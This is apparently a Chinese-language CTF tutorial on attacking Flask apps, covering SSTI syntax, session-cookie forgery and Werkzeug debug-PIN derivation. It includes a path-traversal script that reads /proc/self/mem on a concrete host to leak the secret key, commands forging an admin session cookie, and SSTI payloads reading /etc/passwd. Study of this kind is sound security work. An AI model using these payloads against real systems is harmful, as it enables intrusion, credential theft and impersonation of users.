        app.run(host="0.0.0.0", port=80, debug=True)
#### 基本语法：
官方文档对于模板的语法介绍如下
    {% ... %} for Statements
    {{ ... }} for Expressions to print to the template output
    {# ... #} for Comments not included in the template output
    #  ... ## for Line Statements
  * **{%%}** :主要用来声明变量，也可以用于条件语句和循环语句。
    {% set c='kawhi' %}
    {% if 81==9*9 %}kawhi{% endif %}
    {% for i in ['1','2','3'] %}kawhi{%endfor%}
  * **{{}}** :用于将表达式打印到模板输出，比如我们一般在里面输入2-1，2*2，或者是字符串，调用对象的方法，都会渲染出结果
    {{2-1}} #输出1
    {{2*2}} #输出4
    我们通常会用{{2*2}}简单测试页面是否存在SSTI
  * **{##}** :表示未包含在模板输出中的注释
  * **##** :有和{%%}相同的效果
  * 这里的模板注入主要用到的是{{}}和{%%}
### Session伪造：
#### session说明：
  * session的常见实现形式是当用户发起一个请求的时候，后端会检查该请求中是否包含 sessionid，如果没有则会创造一个叫 sessionid 的 cookie，用于区分不同的 session。sessionid 返回给浏览器，并将 sessionid 保存到==服务器的内存==里面；当已经有了 sessionid，服务端会检查找到与该 sessionid 相匹配的信息直接用。
  * 所以显而易见，==session 和 sessionid 都是后端生成的==。
  * 且由于 session 是后端识别不同用户的重要依据，而 sessionid 又是识别 session 的唯一依据，所以 session 一般都保存在服务端避免被轻易窃取，只返回随机生成的 sessionid 给客户端。
  * 对于攻击者来说，假设需要冒充其他用户，那么必须能够猜到其他用户的 sessionid，这是比较困难的。
#### session搭建：
对于 flask 来说，它的 session 不是保存到内存里的，而是直接把整个 session 都塞到 cookie
里返回给客户端。那么这会导致一个问题，如果我可以直接按照格式生成一个 session 放在 cookie 里，那么就可以达到欺骗后端的效果。
flask是非常轻量级的web框架，它的session是存储在客户端的，是用户可见的，这也就是造成session伪造的根本原因。在flask框架使用session只需要导入session模块即可。在本地开启一个flask服务。
    from flask import Flask,session
    app = Flask(__name__)
    app.secret_key = "iamXiLitter"
    @app.route('/')
    def set_session():
        if 'name' in session:
            name = session['name']
            if name == "XiLitter":
                return "欢迎XiLitter"
            if name == "admin":
                return "欢迎admin"
            else:
                return "你是谁"
        else:
            session['name']="XiLitter"
            return "session重新设置"
    if __name__ == '__main__':
        app.run(debug=False,port=8000)
  * 打开cookie查看到有session，值是类似于base64编码的字符串。
  * 拿去base64解码，解码后我们发现存储格式是json格式存储，还有一堆乱码，那应该就是数据签名。
#### session安全问题：
  * flask框架的session是存储在客户端的，那么就需要解决session是否会被恶意纂改的问题，而flask通过一个secret_key，也就是密钥对数据进行签名来防止session被纂改，在我上面写的例子就定义有密钥。
  * app.secret_key = "iamXiLitter"
  * 正常情况下这个密钥是不会给你看的。但是光有数据签名，安全性还是不够的，session没有做任何加密处理，是用户可见的，我们还是可以得到修改session里的内容，如果我们还得到了用于签名的密钥，那么攻击者就可以进行session伪造。
#### 密钥寻找：
    1. app.py文件
    2. config.py文件
    3. 有关文件读取的代码：
       linux 提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/    本进程pid/，/proc/self/environ是此文件包含设置的初始环境，换句话说就是该进程的环境变量
    4. 可以利用python存储对象的位置在堆上这个特性，app是实例化的Flask对象，而secret key在app.config['SECRET_KEY']，所以可以通过读取/proc/self/mem来读取secret key
#### 堆栈分析：
  * 读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。
  * /proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。网上一些介绍说该文件不可读，乍一看确实是这样？
  * 正确的姿势是结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。
  * 同样的，我们也可以通过写入mem文件来直接写入内存，例如直接修改代码段，放入我们的shellcode，从而在程序流程执行到这一步时执行shellcode来拿shell。
##### 读取堆栈分布：
通过app.py文件我们已知密钥的形式，存储的对象在app.config上，所以可以通过/proc/self/mem读取：
    app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
由于/proc/self/mem内容较多而且存在不可读写部分，直接读取会导致程序崩溃，所以先读取/proc/self/maps获取堆栈分布
    map_list = requests.get(url + f"info?file={bypass}/proc/self/maps")
    map_list = map_list.text.split("\\n")
    for i in map_list:
        map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
        if map_addr:
            start = int(map_addr.group(1), 16)
            end = int(map_addr.group(2), 16)
            print("Found rw addr:", start, "-", end)
##### 读取对应位置内存数据：
然后读取/proc/self/mem，读取对应位置的内存数据，再使用正则表达式查找内容
    res = requests.get(f"{url}/info?file={bypass}/proc/self/mem&start={start}&end={end}")
    if "*abcdefgh" in res.text:
       secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", res.text)
          if secret_key:
        print("Secret Key:", secret_key[0])
##### **合并读取密钥** ：
这里还是借用的大佬的脚本
    import requests
    import re
    url='http://61.147.171.105:56453/'
    s_key = ""
    bypass = "../.."
    # 请求file路由进行读取
    map_list = requests.get(url + f"info?file={bypass}/proc/self/maps")
    map_list = map_list.text.split("\\n")
    for i in map_list:
        # 匹配指定格式的地址
        map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
        if map_addr:
            start = int(map_addr.group(1), 16)
            end = int(map_addr.group(2), 16)
            print("Found rw addr:", start, "-", end)
            # 设置起始和结束位置并读取/proc/self/mem
            res = requests.get(f"{url}/info?file={bypass}/proc/self/mem&start={start}&end={end}")
            # 如果发现*abcdefgh存在其中，说明成功泄露secretkey
            if "*abcdefgh" in res.text:
                # 正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh
                secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", res.text)
                if secret_key:
                    print("Secret Key:", secret_key[0])
                    s_key = secret_key[0]
                    break
#### 伪造脚本使用：
脚本链接：[mirrors / noraj / flask-session-cookie-manager ·
GitCode](https://gitcode.net/mirrors/noraj/flask-session-cookie-manager?utm_source=csdn_github_accelerator)
    解密:python flask_session_manager.py decode -c -s 
    #-c是flask cookie里的session值 -s参数是SECRET_KEY
    python3 flask_session_cookie_manager3.py decode -s "iamXiLitter" -c "eyJuYW1lIjoiWGlMaXR0ZXIifQ.Y9iAVQ.d1mYdUgTehFxirFJcxpEwJEyb6k"
    #{'name': 'XiLitter'}
    加密:python flask_session_manager.py encode -s -t 
    #-s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式
    python3 flask_session_cookie_manager3.py encode -s "iamXiLitter" -t "{'name': 'admin'}"
    #eyJuYW1lIjoiYWRtaW4ifQ.Y9iFlw.ljoX_L0rY-4d9izf7WY7cX2sn0E
#### 替换session值：
最后再替换掉之前登陆成功页面的账号的cookies的session值，然后刷新页面，就可以发现我们已经是管理员身份了
### PIN码攻击：
> PIN是 Werkzeug（它是 Flask 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。
> 您可以使用浏览器中的调试器引脚来启动交互式调试器。请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。调试器
> PIN 只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。
  * werkzeug不同版本以及python不同版本都会影响PIN码的生成
  * 但是PIN码并不是随机生成，当我们重复运行同一程序时，生成的PIN一样，PIN码生成满足一定的生成算法
#### PIN码要素：
    1. username
        通过getpass.getuser()读取
        通过文件/etc/passwd 中找到用户名
        执行代码读取文件：
        {% for c in [].__class__.__base__.__subclasses__() %}
        {% if c.__name__=='catch_warnings' %}
        {{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() }}
        {% endif %}
        {% endfor %}
        或:
        {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']          ('/etc/passwd').read()}}
    2. modname
    通过getattr(mod,"file",None)读取，默认值为flask.app
    3. appname
    通过getattr(app,"name",type(app).name)读取，默认值为Flask
    4. moddir
    getattr(mod, '__file__', None) app.py的绝对路径,flask目录下的一个app.py的绝对路径 从网站报错信息中可以看到
    5. uuidnode
        当前网络的mac地址的十进制数
        通过uuid.getnode()读取
        通过文件/sys/class/net/eth0/address得到16进制结果，注意结果去掉冒号，16进制转化为10进制
        读取文件**/sys/class/net/eth0/address 或者 /sys/class/net/eth33/address eth0为网卡
    6. machine_id
    每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个)：
        1./etc/machine-id 
        2./proc/sys/kernel/random/boot_id 
        3./proc/self/cgroup
        #linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id，有的系统没有这两个文件。
        #docker机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id
        ####docker-id也可以在以下文件夹下寻找    
        /proc/self/mountinfo
        /proc/self/mounts
        /proc/self/cgroup
        /proc/self/cpuset
        ####self绕过：self可以替换为数字进行读取对应文件
        如/proc/self/cpuset
当这6个值我们可以获取到时，就可以推算出生成的PIN码
#### PID爆破：
当/proc/self/文件中self被过滤时，我们可以通过pid爆破来读取文件：
简单介绍一下pid是什么：
linux proc文件系统：
  * Linux系统上的/proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，/proc是一种伪文件系统（也即虚拟文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。
PID：/proc/＜pid＞/文件 ：
  * 目录，系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的 PID号为目录名.
  * cd /proc/之后，你会发现很多的目录和文件，今天首先来介绍的就是那些以数字命名的目录--它们就是linux中的进程号，每当你创建一个进程时，里面就会动态更新多出一个名称为pid的目录
  * 除了以上介绍的这些，还有的是一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的 [PID](https://so.csdn.net/so/search?q=PID&spm=1001.2101.3001.7020)号为目录名，它们是读取进程信息的接口。而self目录则是读取进程本身的信息接口，是一个link。
#### Find加密算法：
接下来开始调试程序，一步步找到生成PIN码的函数，PIN码是werkzeug的策略，先找到flask中导入werkzeug的部分
在run.app行下断点，点击调试，点击步入，进入app.py，转到了flask/app.py，直接Ctrl+F搜索werkzeug
发现程序从werkzeug导入了run_simple模块，而且try部分有run
app的参数，我们直接按住ctrl点击run_simple进去看看，此时进入了seving.py，找到了负责Debug的部分，而PIN码是在debug状态下才有的，那这个部分很有可能存有PIN码生成部分，于是我们继续跟进
此时进入了`__init__.py`，在里面我们发现了pin函数
    def get_pin_and_cookie_name(
        app: "WSGIApplication",
    ) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:
        pin = os.environ.get("WERKZEUG_DEBUG_PIN")
        rv = None
        num = None
        # Pin was explicitly disabled
        if pin == "off":
            return None, None
        # Pin was provided explicitly
        if pin is not None and pin.replace("-", "").isdecimal():
            # If there are separators in the pin, return it directly
            if "-" in pin:
                rv = pin
            else:
                num = pin
        modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
        username: t.Optional[str]
        try:
            # getuser imports the pwd module, which does not exist in Google